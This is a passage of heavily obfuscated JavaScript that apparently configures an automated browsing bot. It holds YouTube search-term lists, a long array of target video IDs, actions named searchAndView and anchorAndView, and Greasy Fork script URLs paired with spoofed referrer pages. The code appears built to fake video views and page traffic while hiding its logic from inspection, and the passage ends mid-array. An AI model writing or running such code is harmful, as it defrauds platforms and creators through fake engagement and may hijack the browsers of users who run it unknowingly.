'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x6c5 + 0x38 * 0x7f + -0x14f9)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1337 + -0x20b8 + -0xd8b * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + T(0x1a) + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * -0xb9d + -0x1 * -0x219b + 0x15fb * -0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    U(0x0) + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    U(0x16) + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    V(0xa, 'jdp%') + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    V(0xe, 'F[LG') + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    T(0xf) + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    T(0x1) + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    T(0x7) + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + T(0x13),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + T(0xc)
    },
    {
      'url': U(0x9) + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + T(0xb) + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + T(0x15) + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + V(0xd, '!f57') + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + V(0x12, 'A4z6') + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
